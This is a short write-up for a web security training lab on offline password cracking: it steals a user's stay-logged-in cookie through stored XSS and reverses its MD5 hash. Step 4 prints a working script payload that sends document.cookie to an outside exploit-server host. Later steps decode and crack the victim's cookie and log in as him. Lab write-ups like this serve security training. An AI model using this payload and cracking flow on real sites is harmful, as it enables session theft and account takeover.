Lab #8 - Offline password cracking

Vulnerability - This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. 

Goal - To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

Your credentials: wiener:peter
Victim's username: carlos

Analysis:
1. Log in with credentials wiener:peter
2. When click stay logged in => in the response, it has an stay-logged-in cookie
=> Decode it as base64: wiener:51dc30ddc473d43a6011e9ebba6ca770
=> See that 51dc30ddc473d43a6011e9ebba6ca770 is the output of MD5 => reverse it and see that it is password(peter)
3. Verify XSS vulnerability of this website in comment functionality
=> Post a comment:
<script>alert(1)</script>
=> see that, when we reload this page, alert(1) is excecuted
=> XSS vulnerability
4. Post a comment with the content:
<script>
    fetch("https://exploit-0a8e002103499f7c80882079019e003c.exploit-server.net/?key=" + document.cookie);
</script>
=> and access log to see requests from victims
=> see stay-logged-in cookie of victim: Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
5. Decode it as base64 => carlos:26323c16d5f4dabff3bb136f2460a943
=> MD5 reverse for it: onceuponatime
=> log in with credentials carlos:onceuponatime and delete this account
